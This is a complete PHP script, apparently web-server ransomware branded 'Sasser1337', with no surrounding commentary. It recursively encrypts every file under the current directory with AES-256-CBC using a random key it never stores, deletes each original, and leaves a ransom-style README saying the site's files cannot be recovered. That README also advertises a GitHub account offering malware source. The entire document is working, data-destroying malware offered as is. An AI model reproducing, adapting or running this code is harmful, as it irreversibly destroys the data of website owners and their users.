<?php

function encrypt_files_and_folders($path) {
    $items = glob($path . '/*');

    foreach ($items as $item) {
        if (is_dir($item)) {
            encrypt_files_and_folders($item);
        } elseif (is_file($item)) {
            if (basename($item) !== '1bdc0ae____README____.txt') {
                encrypt_file($item);
            }
        }
    }
}

function encrypt_file($file_name) {
    $encryption_key = openssl_random_pseudo_bytes(32);
    $iv = openssl_random_pseudo_bytes(16);
    $ciphertext = openssl_encrypt(file_get_contents($file_name), 'AES-256-CBC', $encryption_key, 0, $iv);
    $encrypted_file_name = $file_name . '.Sasser1337';
    file_put_contents($encrypted_file_name, $ciphertext);
    unlink($file_name);
}

$items = glob('*');

foreach ($items as $item) {
    if (is_dir($item)) {
        encrypt_files_and_folders($item);
    } elseif (is_file($item)) {
        if (basename($item) !== '1bdc0ae____README____.txt') {
            encrypt_file($item);
        }
    }
}

file_put_contents("1bdc0ae____README____.txt", "Congratulations, all files on your site have been encrypted by Sasser1337\n\n Get the source code of Malware, trojan, Worm, And more on github\n\nGithub: https://github.com/Sasser1337\n\n Can the files on my site be recovered?\n\n Cannot be recovered\n\n Enjoy");

?>
